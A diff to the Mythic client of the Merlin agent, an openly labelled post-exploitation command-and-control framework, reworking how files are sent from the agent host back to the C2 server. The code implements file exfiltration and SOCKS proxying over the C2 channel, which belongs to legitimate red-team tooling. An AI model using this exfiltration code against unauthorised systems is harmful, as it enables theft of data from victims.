@@ -3,7 +3,7 @@
 
 // Merlin is a post-exploitation command and control framework.
 // This file is part of Merlin.
-// Copyright (C) 2022  Russel Van Tuyl
+// Copyright (C) 2023 Russel Van Tuyl
 
 // Merlin is free software: you can redistribute it and/or modify
 // it under the terms of the GNU General Public License as published by
@@ -62,9 +62,6 @@ import (
 	"github.com/Ne0nd0g/merlin-agent/clients"
 	"github.com/Ne0nd0g/merlin-agent/clients/utls"
 )
-
-// Files is global map used to track Mythic's multistep file transfers. It holds data between requests
-var Files = make(map[string]*jobs.FileTransfer)
 
 // socksConnection is used to map the Mythic incremental integer used for tracking connections to a UUID leveraged by the agent
 var socksConnection = sync.Map{}
@@ -191,6 +188,23 @@ func (client *Client) Send(m messages.Base) (returnMessages []messages.Base, err
 	if err != nil {
 		err = fmt.Errorf("there was an error converting the Merlin message to a Mythic message:\r\n%s", err)
 		return
+	}
+
+	// File Transfer messages are recursively processed and completed through the prior call to convertToMythicMessage()
+	// Therefore, we can return here
+	// If there was more than one job in the message, the returned "payload" will not be empty
+	if m.Type == messages.JOBS && len(payload) == 0 {
+		j := m.Payload.([]jobs.Job)
+		for _, v := range j {
+			if v.Type == jobs.FILETRANSFER {
+				f := j[0].Payload.(jobs.FileTransfer)
+				// When true, the AGENT is downloading the file to the Server; the operator issued the "download" command
+				if f.IsDownload {
+					returnMessages = append(returnMessages, messages.Base{ID: client.AgentID, Type: messages.IDLE})
+					return
+				}
+			}
+		}
 	}
 
 	// Build the request
@@ -575,39 +589,15 @@ func (client *Client) convertToMerlinMessage(data []byte) (returnMessages []mess
 			if response.FileID != "" {
 				cli.Message(cli.DEBUG, fmt.Sprintf("Mythic FileID: %s", response.FileID))
 				if response.Status == "success" {
-					// Pull file data from map
-					if d, ok := Files[response.ID]; ok {
-						// Send actual data
-						f := FileDownload{
-							Chunk:  1,
-							FileID: response.FileID,
-							TaskID: response.ID,
-							Data:   d.FileBlob,
-						}
-						returnMessage.ID = client.AgentID
-						returnMessage.Type = DownloadSend
-						returnMessage.Payload = f
-						// This isn't great because now we're in recursive Send, but YOLO
-						var msgs []messages.Base
-						msgs, err = client.Send(returnMessage)
-						if err != nil {
-							err = fmt.Errorf("there was an error sending the mythic FileDownload message to the server:\r\n%s", err)
-							return
-						}
-						for _, m := range msgs {
-							if m.Token != "" {
-								// Remove the file from the global Files structure
-								delete(Files, m.Token)
-								returnMessages = append(returnMessages, m)
-							} else {
-								err = fmt.Errorf("file download response did not have a task ID:\r\n%+v", m)
-								return
-							}
-						}
-					} else {
-						err = fmt.Errorf("the Mythic global Files map did not contain data for task %s", response.ID)
+					job := jobs.Job{
+						AgentID: client.AgentID,
+						ID:      response.ID,
+						Type:    DownloadSend,
+						Payload: response.FileID,
 					}
-					return
+					returnMessage.Type = messages.JOBS
+					returnMessage.Payload = []jobs.Job{job}
+					returnMessages = append(returnMessages, returnMessage)
 				}
 			}
 			if response.Status == "success" && response.ID != "" {
@@ -686,32 +676,71 @@ func (client *Client) convertToMythicMessage(m messages.Base) (string, error) {
 				response.Output = string(info)
 				returnMessage.Responses = append(returnMessage.Responses, response)
 			case jobs.FILETRANSFER:
-				// Add to global Files map so it can be retrieved later
 				f := job.Payload.(jobs.FileTransfer)
-				Files[job.ID] = &f
-				// Download
-
+				// Download https://docs.mythic-c2.net/customizing/hooking-features/download
 				if f.IsDownload {
-					var fm FileDownloadInitialMessage
-					fm.FullPath = f.FileLocation
-					fm.IsScreenshot = false
-					fm.TaskID = job.ID
-					fm.NumChunks = 1
+					// DownloadInit - Get FileID from Mythic
+					// 1. PostResponse - Added in the convertToMythicMessage() function on the switch for DownloadSend
+					// 2. ClientTaskResponse
+					// 3. FileDownload
+					fm := FileDownload{
+						NumChunks: 1,
+						FullPath:  f.FileLocation,
+					}
 
-					returnMessage := messages.Base{
+					ctr := ClientTaskResponse{
+						ID:       response.ID,
+						Download: &fm,
+					}
+
+					downloadMessage := messages.Base{
 						ID:      client.AgentID,
 						Type:    DownloadInit,
-						Payload: fm,
+						Payload: ctr,
 					}
 
-					// Get FileID from Mythic
-					// This isn't great because now we're in recursive Send, but YOLO
-					_, err := client.Send(returnMessage)
+					resp, err := client.Send(downloadMessage)
 					if err != nil {
-						return "", fmt.Errorf("there was an error sending the mythic FileDownload message to the server:\r\n%s", err)
+						return "", fmt.Errorf("clients/mythic.convertToMythicMessage(): There was an error sending the mythic FileDownload:DownloadInit message to the server: %s", err)
+					}
+
+					// Get the file ID from the response
+					if len(resp) <= 0 {
+						return "", fmt.Errorf("clients/mythic.convertToMythicMessage(): The were no return messages after requesting a FileID from Mythic")
+					}
+					if resp[0].Type != messages.JOBS {
+						return "", fmt.Errorf("clients/mythic.convertToMythicMessage(): The first message in the response for DownloadInit was not a jobs message")
+					}
+					js := resp[0].Payload.([]jobs.Job)
+					if len(js) <= 0 {
+						return "", fmt.Errorf("clients/mythic.convertToMythicMessage(): The first message in the response for DownloadInit did not contain any jobs")
+					}
+					if js[0].Type != DownloadSend {
+						return "", fmt.Errorf("clients/mythic.convertToMythicMessage(): Expected the first job to be a DownloadSend(%d) job but received %d", DownloadSend, js[0].Type)
+					}
+
+					// TODO Chunk the data
+					// DownloadSend - Send actual data
+					fm2 := FileDownload{
+						Data:   f.FileBlob,
+						FileID: js[0].Payload.(string),
+						Chunk:  1,
+					}
+
+					ctr.Download = &fm2
+					ctr.Completed = true
+
+					downloadMessage.Type = DownloadSend
+					downloadMessage.Payload = ctr
+					resp, err = client.Send(downloadMessage)
+					if err != nil {
+						return "", fmt.Errorf("there was an error sending the mythic FileDownload:DownloadSend message to the server: %s", err)
+					}
+					// If this is the only job, then return; else keep processing remaining jobs
+					if len(m.Payload.([]jobs.Job)) == 1 {
+						return "", nil
 					}
 				}
-				returnMessage.Responses = append(returnMessage.Responses, response)
 			case jobs.SOCKS:
 				sockMsg := job.Payload.(jobs.Socks)
 				// SOCKS server's initial response is 0x05, 0x00
@@ -776,24 +805,24 @@ func (client *Client) convertToMythicMessage(m messages.Base) (string, error) {
 			}
 		}
 	case DownloadInit:
-		returnMessage := PostResponseFile{
+		returnMessage := PostResponse{
 			Action:  RESPONSE,
 			Padding: m.Padding,
 		}
-		returnMessage.Responses = append(returnMessage.Responses, m.Payload.(FileDownloadInitialMessage))
+		returnMessage.Responses = append(returnMessage.Responses, m.Payload.(ClientTaskResponse))
 		data, err = json.Marshal(returnMessage)
 		if err != nil {
-			return "", fmt.Errorf("there was an error marshalling the mythic.FileDownloadInitial structure to JSON:\r\n%s", err)
+			return "", fmt.Errorf("there was an error marshalling the mythic.FileDownloadInitial structure to JSON: %s", err)
 		}
 	case DownloadSend:
-		returnMessage := PostResponseDownload{
+		returnMessage := PostResponse{
 			Action:  RESPONSE,
 			Padding: m.Padding,
 		}
-		returnMessage.Responses = append(returnMessage.Responses, m.Payload.(FileDownload))
+		returnMessage.Responses = append(returnMessage.Responses, m.Payload.(ClientTaskResponse))
 		data, err = json.Marshal(returnMessage)
 		if err != nil {
-			return "", fmt.Errorf("there was an error marshalling the mythic.FileDownload structure to JSON:\r\n%s", err)
+			return "", fmt.Errorf("there was an error marshalling the mythic.FileDownload structure to JSON: %s", err)
 		}
 	default:
 		return "", fmt.Errorf("unhandled message type: %d for convertToMythicMessage()", m.Type)
